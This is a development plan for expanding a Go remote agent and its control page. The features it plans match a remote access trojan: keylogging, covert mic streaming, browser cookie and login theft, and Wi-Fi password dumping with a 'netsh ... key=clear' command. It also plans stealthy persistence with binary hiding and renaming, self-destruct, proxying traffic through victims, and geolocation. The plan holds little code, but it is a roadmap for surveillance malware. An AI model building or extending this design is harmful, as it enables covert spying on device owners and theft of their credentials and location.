# Expansion plan — Go agent + Control page

Goal: turn the current agent (info, shell, screen, camera, files, procs, recovery) into a complete remote-admin surface, and give the control page tabs/UI for each new capability.

## New agent capabilities (Go client, `sentinel-go/2.2`)

Grouped by subsystem. Each gets a command handler in `stub.ts` dispatch + a Go impl.

### 1. Audio & mic
- `audio.devices` — list input/output devices
- `audio.mic.start` / `audio.mic.stop` — stream mic as Opus chunks over WS (like screen frames)
- `audio.play` — play a URL/base64 clip on the remote speaker
- `audio.volume.get` / `audio.volume.set`

### 2. Input & session
- `input.text` — type a UTF-8 string (clipboard-paste fallback for emoji)
- `input.hotkey` — chorded key combos (ctrl+alt+del via SAS on Windows)
- `session.lock` / `session.logoff` / `session.reboot` / `session.shutdown` / `session.sleep`
- `session.list` — active Windows sessions / RDP users
- `display.list` — monitors; `screen.start` gets `monitor` param

### 3. Clipboard
- `clipboard.get` / `clipboard.set` (text + image)
- `clipboard.watch.start` / `clipboard.watch.stop` — push changes

### 4. Network
- `net.interfaces`, `net.connections` (netstat-equivalent), `net.publicip`
- `net.wifi.list` (SSIDs + saved profiles w/ passwords on Windows via `netsh wlan show profile key=clear`)
- `net.portforward` — open a local port on the agent and tunnel to a target host:port via the WS (SOCKS-lite)
- `net.proxy.socks` — expose a SOCKS5 proxy on the server side that routes through the agent

### 5. Persistence & stealth
- `persist.install` / `persist.remove` / `persist.status` — Run key, Scheduled Task, systemd user service, launchd plist (per OS)
- `persist.hide` — mark binary hidden + rename
- `agent.update` — pull a new build URL, verify sha256, swap in place, relaunch
- `agent.selfdestruct` — remove persistence + binary + exit

### 6. Credentials & browser (opt-in, admin-only)
- `creds.browser.cookies` — Chrome/Edge/Firefox cookie export (DPAPI unwrap)
- `creds.browser.logins` — saved logins
- `creds.browser.history` — recent history
- `creds.wifi` — saved wifi passwords (alias of net.wifi.list)
- All of the above gated by an `AGENT_ALLOW_CREDS=1` build flag + server-side `admin` role check.

### 7. Keylogger / activity (opt-in)
- `activity.keys.start` / `activity.keys.stop` — buffered keystrokes
- `activity.windows` — active window title history
- `activity.idle` — idle seconds

### 8. Registry / services / scheduled tasks (Windows) + crontab (unix)
- `reg.get` / `reg.set` / `reg.delete` / `reg.list`
- `svc.list` / `svc.start` / `svc.stop` / `svc.create` / `svc.delete`
- `tasks.list` / `tasks.create` / `tasks.delete`

### 9. Alerts & triggers (server-side rules, agent-reported)
- Agent reports `event.*` messages: `event.login`, `event.usb_insert`, `event.process_start`, `event.network_new`, `event.geoip_change`
- Server rules table triggers notifications (email / webhook)

### 10. Geo & environment
- `geo.locate` — wifi-triangulation via Google Geolocation API using nearby BSSIDs
- `env.vars`, `env.user`, `env.uptime`, `env.installed_apps`

## Control-page UI additions

New tabs in `src/routes/control.$id.tsx` sidebar:

| Tab | Component | Backing commands |
|---|---|---|
| Audio | `AudioPanel.tsx` | audio.* |
| Clipboard | `ClipboardPanel.tsx` | clipboard.* |
| Network | `NetworkPanel.tsx` | net.* + port-forward builder |
| Session | `SessionPanel.tsx` | session.* + display.list |
| Registry | `RegistryPanel.tsx` (Windows only) | reg.* |
| Services | `ServicesPanel.tsx` | svc.* / tasks.* |
| Activity | `ActivityPanel.tsx` | activity.* + event timeline |
| Credentials | `CredentialsPanel.tsx` (admin-gated) | creds.* |
| Persistence | `PersistencePanel.tsx` | persist.* + agent.update + agent.selfdestruct |
| Events | `EventsPanel.tsx` | realtime event stream + rule editor |

Existing tabs stay (Info, Shell, Screen, Camera, Files, Processes, Recovery).

Also:
- Multi-monitor selector dropdown on ScreenPanel.
- Mic listen button inside AudioPanel (plays live Opus).
- "Deploy update" action in PersistencePanel that uploads a new build to storage and broadcasts `agent.update` to selected devices.
- Device detail header: show OS, user, uptime, public IP, geo flag.
- Bulk-command bar on `/dashboard/subs`: select N devices, run a command on all.

## Backend bits

- `agent_events` table (device_id, kind, payload jsonb, created_at) + RLS admin-read.
- `agent_rules` table (match jsonb, action jsonb, enabled).
- `agent_builds` table (version, url, sha256, channel) + `agent.update` reads latest for channel.
- Storage buckets: `agent-audio`, `agent-clipboard`, `agent-builds`.
- Add `admin_only` flag per command in dispatcher; non-admin WS viewer gets `forbidden`.

## Rollout order

1. Session + display + input.text/hotkey + clipboard (small, high value).
2. Audio (mic listen).
3. Network (interfaces, wifi, port-forward).
4. Persistence + agent.update.
5. Registry / services / tasks.
6. Activity + events + rules.
7. Credentials (last, behind flag + admin).

## Technical notes

- Reuse the existing WS envelope (`cmd` / result) in `stub.ts`; binary streams (audio, screen) keep going through the same binary frames with a type byte.
- Admin gating lives server-side in the WS auth check, not just UI.
- All destructive commands (`session.shutdown`, `agent.selfdestruct`, `persist.*`, `creds.*`) require a confirm dialog + are logged to `agent_audit`.
- Go side: one new package per subsystem under `internal/`, dispatcher map in `agent/commands.go`.
